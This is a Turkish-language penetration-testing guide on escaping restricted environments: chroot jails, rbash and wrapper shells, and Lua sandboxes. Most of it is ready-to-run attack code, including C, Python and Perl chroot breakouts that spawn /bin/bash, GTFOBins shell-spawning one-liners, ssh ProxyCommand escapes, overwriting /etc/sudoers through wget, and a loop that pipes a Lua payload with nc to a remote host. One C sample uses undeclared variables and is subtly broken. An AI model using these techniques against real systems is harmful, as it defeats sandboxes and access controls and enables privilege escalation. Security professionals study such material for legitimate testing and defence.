# Jails'ten Kaçış

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Herhangi bir binary'yi "Shell" özelliğiyle çalıştırıp çalıştıramadığınızı** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **üzerinden arayın**

## Chroot'tan Kaçışlar

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: chroot mekanizması, **yetkili** (**root**) **kullanıcıların** kasıtlı olarak kurcalamasına karşı **koruma sağlamak için tasarlanmamıştır**. Çoğu sistemde chroot context'leri düzgün şekilde iç içe çalışmaz ve **yeterli yetkilere sahip chroot edilmiş programlar kaçmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, kaçmak için chroot içinde root olmanız gerektiği anlamına gelir.<sup>[[4]](#references)</sup>

> [!TIP]
> **[**chw00t**](https://github.com/earthquake/chw00t) aracı**, aşağıdaki senaryoları kötüye kullanmak ve `chroot`'tan kaçmak için oluşturulmuştur.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Bir chroot içinde **root** iseniz, **başka bir chroot oluşturarak kaçabilirsiniz**. Bunun nedeni, (Linux'ta) 2 chroot'un birlikte bulunamamasıdır; bu nedenle bir klasör oluşturup ardından **yeni bir chroot'u**, **siz onun dışında olacak şekilde**, bu yeni klasörde oluşturursanız artık **yeni chroot'un dışında** olursunuz ve dolayısıyla FS içinde bulunursunuz.
>
> Bunun nedeni, chroot'un genellikle çalışma dizininizi belirtilen dizine taşımamasıdır; böylece bir chroot oluşturabilir, ancak onun dışında olabilirsiniz.<sup>[[4]](#references)[[5]](#references)</sup>

Genellikle bir chroot jail içinde `chroot` binary'sini bulamazsınız, ancak bir binary'yi **compile edebilir, upload edebilir ve execute edebilirsiniz**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Bu, önceki duruma benzer; ancak bu durumda **saldırgan mevcut dizine ait bir file descriptor saklar** ve ardından **chroot'u yeni bir klasörde oluşturur**. Son olarak, chroot'un **dışında** bu **FD'ye erişimi** olduğundan, ona erişir ve **kaçar**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD, Unix Domain Sockets üzerinden geçirilebilir, bu nedenle:
>
> - Bir child process oluşturun (fork)
> - Parent ve child process'lerin iletişim kurabilmesi için UDS oluşturun
> - Child process'te farklı bir klasörde chroot çalıştırın
> - Parent process'te, yeni child process chroot'unun dışında bulunan bir klasörün FD'sini oluşturun
> - Bu FD'yi UDS kullanarak child process'e geçirin
> - Child process bu FD'ye chdir yapar; FD kendi chroot'unun dışında olduğundan jail'den escape eder.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Root device'ı (/) chroot içindeki bir klasöre mount etmek
> - Bu klasöre chroot yapmak
>
> Bu, Linux'ta mümkündür.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Procfs'yi chroot içindeki bir klasöre mount edin (henüz mount edilmemişse)
> - Farklı bir root/cwd entry'sine sahip bir PID arayın; örneğin: /proc/1/root
> - Bu entry'ye chroot yapın.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Bir Fork (child process) oluşturun, FS içinde daha derinde bulunan farklı bir klasöre chroot yapın ve bu klasöre CD yapın
> - Parent process'ten, child process'in bulunduğu klasörü child process'in chroot konumundan önceki bir klasöre taşıyın
> - Bu child process kendisini chroot'un dışında bulacaktır.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Bir process'in `ptrace` ile attach olup olamayacağı credentials, capabilities ve Yama gibi etkin security module'lerine bağlıdır; bu nedenle aynı kullanıcı debugging işlemi system policy tarafından kısıtlanabilir.<sup>[[8]](#references)</sup>
> - Attachment izinliyse, bir process'e ptrace uygulayabilir ve onun içinde shellcode çalıştırabilirsiniz ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Jail hakkında bilgi alın:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH'i Değiştirme

PATH ortam değişkenini değiştirip değiştiremeyeceğinizi kontrol edin.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Vim kullanma

Vim mevcutsa, `shell` seçeneğini çalıştırabileceğiniz bir shell olarak ayarlayın ve `:shell` komutunu çağırın.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pager'lar ve help viewer'lar

Birçok kısıtlı ortam hâlâ **pager**'ları veya **help viewer**'ları kullanılabilir durumda bırakır. Bunları abuse etmek genellikle `PATH`'i yeniden oluşturmaya çalışmaktan daha hızlıdır.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git` kullanılabiliyorsa `--paginate` seçeneği çıktıyı `less` veya `$PAGER`'a gönderir; bu, bir pager escape kullanılabildiğinde faydalıdır.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Yaygın GTFOBins tek satırlık komutları

Hangi binary'lere erişilebildiğini öğrendikten sonra, önce bariz shell başlatıcılarını test edin:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Yalnızca izin verilen bir komuta **argüman enjekte** edebiliyorsanız (komutu serbestçe çalıştırmak yerine), **GTFOArgs**'ı da kontrol edin.<sup>[[17]](#references)</sup>

### Script oluşturma

İçerik olarak _/bin/bash_ bulunan çalıştırılabilir bir dosya oluşturup oluşturamadığınızı kontrol edin
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH ile bash alın

SSH üzerinden erişim sağlıyorsanız, sunucudan kısıtlı login shell yerine **farklı bir program** çalıştırmasını isteyebilirsiniz.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh` yerel olarak izin verilen birkaç binary'den biriyse, bunun **GTFOBin** olarak da kötüye kullanılabileceğini unutmayın; `LocalCommand` ve `ProxyCommand` seçenekleri yerel olarak yapılandırılmış yardımcı komutları çalıştırır.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

Bash'te bir nameref atamaları başka bir değişkene yönlendirirken, `BASH_CMDS` öğesine bir komut eklemek bu komutu Bash'in dahili komut hash tablosuna ekler.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wget'in `-O` seçeneği indirilen içeriği belirtilen çıktı dosyasına yazar; bu yol yazılabilirse `/etc/sudoers` gibi bir dosyanın üzerine yazılabilir.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Bazı ortamlar sizi doğrudan plain `rbash` içine değil, `git-shell`, `rssh` veya `lshell` gibi **wrapper**'lar içine bırakır:

- `git-shell` yalnızca server-side Git komutlarını ve `~/git-shell-commands/` içinde bulunan her şeyi kabul eder. Bu dizin mevcutsa, izin verilen özel action'ları listelemek için `help` çalıştırın. Buraya **write** edebiliyorsanız, bu dizine bırakılan herhangi bir executable erişilebilir hale gelir.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` genellikle yalnızca `scp`, `sftp`, `rsync` veya Git-style operation'lara izin verir. Bu durumlarda öncelikle **file write primitives** üzerine odaklanın: `authorized_keys` dosyasını, bir shell startup file'ını veya bir helper script'i yazılabilir bir konuma upload edin ve ardından `ssh -t ...` ile yeniden bağlanın.
- Wrapper yalnızca command line'ı filtreliyorsa, erişilebilir binary'leri enumerate edin ve ardından tekrar **GTFOBins / GTFOArgs**'e pivot edin.

### Other tricks

Ayrıca şunları da kontrol edin:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Şu sayfa da ilginç olabilir:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Python jail'lerinden escape etmeye ilişkin trick'ler aşağıdaki sayfada:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Bu sayfada, lua içinde erişiminiz olan global function'ları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Standart `load`, `string.char` ve `os.execute` function'ları mevcut olduklarında bu chunk'ı oluşturup çalıştırabilir.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir tablo işlevi, nokta sözdizimi yerine `rawget` kullanılarak da alınabilir.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Bir library table'ını enumerate etmek için `pairs` kullanın.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
`pairs` table index'lerini numaralandırdığı sıra belirtilmemiştir; bu nedenle belirli bir function'ın ilk sırada görünmesine güvenmeyin. Belirli bir function'ı çalıştırmanız gerekiyorsa, farklı Lua environment'larını yükleyip library'nin ilk function'ını çağırarak bir brute force attack gerçekleştirebilirsiniz.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua shell edin**: Sınırlı bir lua shell içindeyseniz, interaktif moda giren `debug.debug()` çağrısını yaparak yeni bir lua shell (ve umarız sınırsız) elde edebilirsiniz.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Çeşitli chroot Çözümlerinden Nasıl Kaçılır (Bucsay Balazs, DeepSec konuşması ve slaytları)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Başvuru Kılavuzu – Kısıtlı Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git Dokümantasyonu](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux manual sayfası](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot escape aracı](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux manual sayfası](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux manual sayfası](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux manual sayfası](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git Dokümantasyonu](https://git-scm.com/docs/git)
- [10] [:shell – Vim dokümantasyonu](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash Builtins – GNU Bash Başvuru Kılavuzu](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash Variables – GNU Bash Başvuru Kılavuzu](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget Kılavuzu](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD manual sayfası](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD manual sayfası](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 Başvuru Kılavuzu](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
